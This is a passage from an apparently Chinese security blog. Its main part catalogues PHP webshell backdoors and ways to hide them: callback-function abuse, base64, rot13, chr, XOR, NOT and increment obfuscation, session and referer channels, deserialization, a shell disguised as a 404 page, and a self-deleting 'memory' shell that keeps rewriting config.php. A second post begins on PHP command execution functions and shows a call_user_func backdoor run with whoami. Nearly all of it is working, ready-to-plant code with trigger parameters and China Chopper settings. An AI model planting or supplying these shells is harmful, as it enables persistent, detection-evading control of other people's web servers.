<h4 id="register-tick-function"><a href="#register-tick-function" class="headerlink" title="register_tick_function()"></a>register_tick_function()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = $_REQUEST[&apos;a&apos;];</span><br><span class="line">declare(ticks=1);</span><br><span class="line">register_tick_function ($a, $_REQUEST[&apos;www&apos;]);</span><br><span class="line"></span><br><span class="line">// POST: a=assert&amp;www=phpinfo()</span><br></pre></td></tr></table></figure>
<h4 id="filter-var-amp-filter-var-array"><a href="#filter-var-amp-filter-var-array" class="headerlink" title="filter_var()&amp;filter_var_array()"></a>filter_var()&amp;filter_var_array()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">filter_var($_REQUEST[&apos;www&apos;], FILTER_CALLBACK, array(&apos;options&apos; =&gt; &apos;assert&apos;));</span><br><span class="line">//filter_var_array(array(&apos;test&apos; =&gt; $_REQUEST[&apos;www&apos;]), array(&apos;test&apos; =&gt; array(&apos;filter&apos; =&gt; FILTER_CALLBACK, &apos;options&apos; =&gt; &apos;assert&apos;)));</span><br><span class="line"></span><br><span class="line">//POST: www=phpinfo()</span><br></pre></td></tr></table></figure>
<h4 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a>array_filter()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$e = $_REQUEST[&apos;e&apos;];</span><br><span class="line">$arr = array($_POST[&apos;www&apos;],);</span><br><span class="line">array_filter($arr, base64_decode($e));</span><br><span class="line">//caidao:  ***.php?e=YXNzZXJ0  pass:www    YXNzZXJ0为assert的base64编码</span><br><span class="line">//***.php  POST数据  e=YXNzZXJ0&amp;www=phpinfo()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @array_map(assert,(array)base64_decode($_REQUEST[&apos;e&apos;]));</span><br><span class="line">//caidao: ***.php?e=YXNzZXJ0KCRfUkVRVUVTVFsnd3d3J10p  pass:www    YXNzZXJ0KCRfUkVRVUVTVFsnd3d3J10p解码为assert($_REQUEST[&apos;www&apos;])</span><br><span class="line">//POST: e=cGhwaW5mbygp   cGhwaW5mbygp解码为phpinfo()</span><br></pre></td></tr></table></figure>
<h3 id="2-拆分重组"><a href="#2-拆分重组" class="headerlink" title="2)    拆分重组"></a>2)    拆分重组</h3><h4 id="拆分重组示例1"><a href="#拆分重组示例1" class="headerlink" title="拆分重组示例1"></a>拆分重组示例1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  $req = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;;$req($_POST[&quot;www&quot;]); </span><br><span class="line">//POST: www=phpinfo()</span><br><span class="line">//caidao: ***.php pass:www</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="拆分重组合示例2"><a href="#拆分重组合示例2" class="headerlink" title="拆分重组合示例2"></a>拆分重组合示例2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $xy = &quot;eval&quot;; $xy .= &quot;(&quot;;$xy .= &quot;$&quot;;$xy .= &quot;_PO&quot;;$xy .= &quot;ST[&apos;www&apos;]);&quot;;@eval($xy);</span><br><span class="line">//caidao: ***.php pass:www</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="3-base64编码-可变函数"><a href="#3-base64编码-可变函数" class="headerlink" title="3)    base64编码+可变函数"></a>3)    base64编码+可变函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">//$a = @base64_decode($a=$_POST[&apos;fun&apos;]);$a($_POST[&apos;www&apos;]);</span><br><span class="line">$a = @base64_decode($a=$_REQUEST[&apos;fun&apos;]);$a($_REQUEST[&apos;www&apos;]);</span><br><span class="line">//POST: fun=YXNzZXJ0&amp;www=phpinfo()</span><br><span class="line">//caidao: fun=YXNzZXJ0  pass:www</span><br><span class="line">//base64编码+可变函数</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="4-rot13加密-可变函数"><a href="#4-rot13加密-可变函数" class="headerlink" title="4)    rot13加密+可变函数"></a>4)    rot13加密+可变函数</h3><h4 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $a=str_rot13(&apos;nffreg&apos;);$a($_POST[&apos;www&apos;]);</span><br><span class="line">//nffreg为assert的rot13加密</span><br><span class="line">//POST: www=phpinfo()</span><br><span class="line">//rot13加密+可变函数</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="示例2-ye版"><a href="#示例2-ye版" class="headerlink" title="示例2-ye版"></a>示例2-ye版</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">……</span><br></pre></td></tr></table></figure>
<h3 id="5-chr编码"><a href="#5-chr编码" class="headerlink" title="5)    chr编码"></a>5)    chr编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">assert(chr(97).chr(115).chr(115).chr(101).chr(114).chr(116).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(120).chr(93).chr(41)); </span><br><span class="line">// chr解出来是assert($_POST[x])</span><br><span class="line">//POST: x=phpinfo()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="6-注释符"><a href="#6-注释符" class="headerlink" title="6)    注释符"></a>6)    注释符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@$_=&quot;s&quot;.&quot;s&quot;./*-/*-*/&quot;e&quot;./*-/*-*/&quot;r&quot;;</span><br><span class="line">@$_=/*-/*-*/&quot;a&quot;./*-/*-*/$_./*-/*-*/&quot;t&quot;;</span><br><span class="line">@$_/*-/*-*/($/*-/*-*/&#123;&quot;_P&quot;./*-/*-*/&quot;OS&quot;./*-/*-*/&quot;T&quot;&#125;</span><br><span class="line">[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]); </span><br><span class="line"></span><br><span class="line">// 密码 -7</span><br><span class="line">// POST：-7=phpinfo()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="7-运算符"><a href="#7-运算符" class="headerlink" title="7)    运算符"></a>7)    运算符</h3><h4 id="异或运算"><a href="#异或运算" class="headerlink" title="异或运算"></a>异或运算</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    @$_++; // $_ = 1</span><br><span class="line">    $__=(&quot;#&quot;^&quot;|&quot;); // $__ = _</span><br><span class="line">    $__.=(&quot;.&quot;^&quot;~&quot;); // _P</span><br><span class="line">    $__.=(&quot;/&quot;^&quot;`&quot;); // _PO</span><br><span class="line">    $__.=(&quot;|&quot;^&quot;/&quot;); // _POS</span><br><span class="line">    $__.=(&quot;&#123;&quot;^&quot;/&quot;); // _POST </span><br><span class="line">    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); // $_POST[0]($_POST[1]);</span><br><span class="line">	</span><br><span class="line">	//POST: 0=assert&amp;1=phpinfo()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="取反运算"><a href="#取反运算" class="headerlink" title="取反运算"></a>取反运算</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$__=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;);</span><br><span class="line">$_=$__/$__;</span><br><span class="line"></span><br><span class="line">$____=&apos;&apos;;</span><br><span class="line">$___=&quot;瞰&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;的&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;半&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;始&quot;;$____.=~($___&#123;$__&#125;);</span><br><span class="line"></span><br><span class="line">$_____=&apos;_&apos;;$___=&quot;俯&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;瞰&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;次&quot;;$_____.=~($___&#123;$_&#125;);$___=&quot;站&quot;;$_____.=~($___&#123;$_&#125;);</span><br><span class="line"></span><br><span class="line">$_=$$_____;</span><br><span class="line">$____($_[$__]);</span><br><span class="line"></span><br><span class="line">//POST: 2=phpinfo();</span><br></pre></td></tr></table></figure>
<h4 id="自增运算"><a href="#自增运算" class="headerlink" title="自增运算"></a>自增运算</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=[];</span><br><span class="line">$_=@&quot;$_&quot;; // $_=&apos;Array&apos;;</span><br><span class="line">$_=$_[&apos;!&apos;==&apos;@&apos;]; // $_=$_[0];</span><br><span class="line">$___=$_; // A</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">$___.=$__; // S</span><br><span class="line">$___.=$__; // S</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++; // E </span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R</span><br><span class="line">$___.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span><br><span class="line">$___.=$__;</span><br><span class="line"></span><br><span class="line">$____=&apos;_&apos;;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S</span><br><span class="line">$____.=$__;</span><br><span class="line">$__=$_;</span><br><span class="line">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span><br><span class="line">$____.=$__;</span><br><span class="line"></span><br><span class="line">$_=$$____;</span><br><span class="line">$___($_[_]); // ASSERT($_POST[_]);</span><br><span class="line"></span><br><span class="line">//POST: _=phpinfo()</span><br></pre></td></tr></table></figure>
<h3 id="8-正则函数"><a href="#8-正则函数" class="headerlink" title="8)    正则函数"></a>8)    正则函数</h3><h4 id="mb-ereg-replace"><a href="#mb-ereg-replace" class="headerlink" title="mb_ereg_replace()"></a>mb_ereg_replace()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php mb_ereg_replace(&apos;.*&apos;, $_REQUEST[&apos;www&apos;], &apos;&apos;, &apos;e&apos;); ?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="preg-filter"><a href="#preg-filter" class="headerlink" title="preg_filter()"></a>preg_filter()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo preg_filter(&apos;|.*|e&apos;, $_REQUEST[&apos;www&apos;], &apos;&apos;); ?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="9-利用session"><a href="#9-利用session" class="headerlink" title="9)    利用session"></a>9)    利用session</h3><p>利用session机制 需要读取服务器session文件权限<br>POST: www=cGhwaW5mbygpOw==      cGhwaW5mbygpOw==解码为phpinfo();<br>在C:\Windows\sess_k12th0l3kimv4i07fi0lm1bjr3 文件中写入cmd|s:16:”cGhwaW5mbygpOw==”;<br>C:\Windows\sess_之后的值与cookie 中的 PHPSESSID值一样 </p>
<p>php的session文件的保存路径在php.ini中设置 或者可以在phpinfo()的session.save_path查看<br>session文件的命名规则是 sess_[PHPSESSID]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">session_start();$_SESSION[&apos;cmd&apos;] = trim($_POST[&apos;www&apos;]);</span><br><span class="line">echo preg_replace(&apos;\&apos;a\&apos;eis&apos;,&apos;e&apos;.&apos;v&apos;.&apos;a&apos;.&apos;l&apos;.&apos;(base64_decode($_SESSION[\&apos;cmd\&apos;]))&apos;,&apos;a&apos;);</span><br><span class="line"></span><br><span class="line">//POST: www=cGhwaW5mbygpOw==      cGhwaW5mbygpOw==解码为phpinfo();</span><br><span class="line">//var_dump($_SESSION);</span><br><span class="line">//var_dump($_COOKIE[&apos;PHPSESSID&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="10-利用referer"><a href="#10-利用referer" class="headerlink" title="10)    利用referer"></a>10)    利用referer</h3><p>refer1.php+refer2.php两个文件组成构成后门，访问后门是访问refer2.php<br>refer1.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//refer1.php  refer1.php+refer2.php两个文件组成构成后门，访问后门是访问refer2.php</span><br><span class="line">header(&apos;Content-type:text/html;charset=utf-8&apos;);</span><br><span class="line">parse_str($_SERVER[&apos;HTTP_REFERER&apos;], $a);</span><br><span class="line">if(reset($a) == &apos;10&apos; &amp;&amp; count($a) == 9) &#123;</span><br><span class="line">   eval(base64_decode(str_replace(&quot; &quot;, &quot;+&quot;, implode(array_slice($a, 6)))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>refer2.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//refer2.php  直接访问refer2.php</span><br><span class="line">header(&apos;Content-type:text/html;charset=utf-8&apos;);</span><br><span class="line">//要执行的代码</span><br><span class="line">$code = &lt;&lt;&lt;CODE</span><br><span class="line">phpinfo();</span><br><span class="line">CODE;</span><br><span class="line">//进行base64编码</span><br><span class="line">$code = base64_encode($code);</span><br><span class="line">//构造referer字符串</span><br><span class="line">$referer = &quot;a=10&amp;b=ab&amp;c=34&amp;d=re&amp;e=32&amp;f=km&amp;g=&#123;$code&#125;&amp;h=&amp;i=&quot;;</span><br><span class="line">//后门url</span><br><span class="line">$url = &apos;http://localhost/phpcode2019/phpwebshell/r1.php&apos;;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">$options = array(</span><br><span class="line">    CURLOPT_URL =&gt; $url,</span><br><span class="line">    CURLOPT_HEADER =&gt; FALSE,</span><br><span class="line">    CURLOPT_RETURNTRANSFER =&gt; TRUE,</span><br><span class="line">    CURLOPT_REFERER =&gt; $referer</span><br><span class="line">);</span><br><span class="line">curl_setopt_array($ch, $options);</span><br><span class="line">echo curl_exec($ch);</span><br></pre></td></tr></table></figure></p>
<h3 id="11-PHP反射"><a href="#11-PHP反射" class="headerlink" title="11)    PHP反射"></a>11)    PHP反射</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$func = new ReflectionFunction($_POST[&apos;a&apos;]);</span><br><span class="line">echo $func-&gt;invokeArgs(array($_POST[&apos;b&apos;]));</span><br><span class="line">//POST:a=assert&amp;b=phpinfo()</span><br><span class="line">//php反射特性</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="12-PHP反序列化"><a href="#12-PHP反序列化" class="headerlink" title="12)    PHP反序列化"></a>12)    PHP反序列化</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class shell&#123;</span><br><span class="line">    public $code=&quot;tmpdata&quot;;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">       assert($this-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ser = $_GET[&apos;www&apos;];</span><br><span class="line">unserialize($ser);</span><br><span class="line">//?www=O:5:&quot;shell&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>生成序列化POC：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class shell&#123;</span><br><span class="line">    public $code=&quot;phpinfo();&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$reload = new shell;</span><br><span class="line">$res = serialize($reload);</span><br><span class="line">echo $res;</span><br><span class="line">//输出 O:5:&quot;shell&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br><span class="line">//生成序列化POC</span><br></pre></td></tr></table></figure></p>
<h3 id="13-404马"><a href="#13-404马" class="headerlink" title="13)    404马"></a>13)    404马</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;404 Not Found&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">@call_user_func($_REQUEST[&apos;a1&apos;],$_REQUEST[&apos;a2&apos;]);</span><br><span class="line">header(&apos;HTTP/1.1 404 Not Found&apos;);</span><br><span class="line">	//POST: a1=system&amp;a2=whoami  //命令执行</span><br><span class="line">	///POST: a1=assert&amp;a2=phpinfo()   //代码执行</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="14-内存马"><a href="#14-内存马" class="headerlink" title="14)    内存马"></a>14)    内存马</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //php内存马 //处理办法:重启Apache</span><br><span class="line">    set_time_limit(0);      //设置脚本最大执行时间  设置为0，没有时间限制</span><br><span class="line">    ignore_user_abort(1);   //设置客户端断开连接时是否中断脚本的执行  设置为1则不会中断执行</span><br><span class="line">    unlink(__FILE__); //删除自身</span><br><span class="line">    while(1)&#123;</span><br><span class="line">        file_put_contents(&apos;D:\\phpStudy\\***\\config.php&apos;,&apos;&lt;?php call_user_func($_REQUEST[&quot;a1&quot;],$_REQUEST[&quot;a2&quot;]);?&gt;&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a><br><a href="https://joychou.org/web/webshell.html#directory025622261147745225" target="_blank" rel="noopener">https://joychou.org/web/webshell.html#directory025622261147745225</a><br><a href="https://klionsec.github.io/2017/10/11/bypasswaf-for-webshell/" target="_blank" rel="noopener">https://klionsec.github.io/2017/10/11/bypasswaf-for-webshell/</a><br><a href="https://www.freebuf.com/articles/web/9396.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/9396.html</a>  </p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/17/PHP命令执行&代码执行/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="pplsec">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/ppl.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="pplsec">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/17/PHP命令执行&代码执行/" itemprop="url">PHP命令执行&代码执行</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-17T08:39:54+08:00">
                2019-01-17
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/代码审计/" itemprop="url" rel="index">
                    <span itemprop="name">代码审计</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>常见php回调函数，可调用其他命令/代码执行函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call_user_func()、call_user_func_array()、create_function()、</span><br><span class="line">array_walk()、 array_map()、array_filter()、	</span><br><span class="line">usort()、ob_start()、可变函数$_GET[&apos;a&apos;]($_GET[&apos;b&apos;])</span><br></pre></td></tr></table></figure></p>
<p>常见php可执行系统命令的函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system()、passthru()、exec()、shell_exec()、pcntl_exec()、popen()、proc_open()</span><br><span class="line">、反单引号</span><br></pre></td></tr></table></figure></p>
<p>常见php可代码执行的函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval()、assert()、preg_replace()、$</span><br></pre></td></tr></table></figure></p>
<p>php配置文件php.ini里有个disable_functions = 配置选项，可自定义禁用某些php危险函数。如：<br>disable_functions =system,passthru,shell_exec,exec,popen</p>
<h3 id="回调函数命令执行-代码执行"><a href="#回调函数命令执行-代码执行" class="headerlink" title="回调函数命令执行/代码执行"></a>回调函数命令执行/代码执行</h3><h4 id="1-call-user-func"><a href="#1-call-user-func" class="headerlink" title="1)    call_user_func()"></a>1)    call_user_func()</h4><p>call_user_func ( callable $callback [, mixed $parameter [, mixed $… ]] )<br>call_user_func — 把第一个参数作为回调函数调用, 其余参数是回调函数的参数</p>
<p>2019年1月11日ThinkPHP 5.0.x~5.2x爆出的远程代码执行漏洞就是由call_user_func()触发。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	call_user_func($_GET[&apos;a1&apos;],$_GET[&apos;a2&apos;]);</span><br><span class="line">	//xxx.php?a1=system&amp;a2=whoami  //命令执行</span><br><span class="line">	///xxx.php?a1=assert&amp;a2=phpinfo()   //代码执行</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
